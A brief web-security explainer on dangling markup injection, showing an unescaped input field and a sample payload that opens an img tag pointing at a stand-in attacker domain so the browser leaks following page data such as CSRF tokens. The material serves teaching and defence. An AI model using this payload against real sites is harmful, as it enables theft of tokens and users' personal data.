**What is Dangling Markup Injection?**

Dangling markup injection is a technique for capturing cross-domain data when full XSS isn’t possible. It exploits unsafe embedding of attacker-controlled input like:

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

If the app doesn’t filter `>` or `"`, an attacker can break out of the tag using:

```html
">
```

Instead of full XSS, they inject something like:

```html
"><img src='//attacker-website.com?
```

This "dangling" attribute causes the browser to treat following data as part of the URL, sending it to the attacker’s server. This may leak sensitive info like CSRF tokens or emails. Any attribute making external requests can be used.
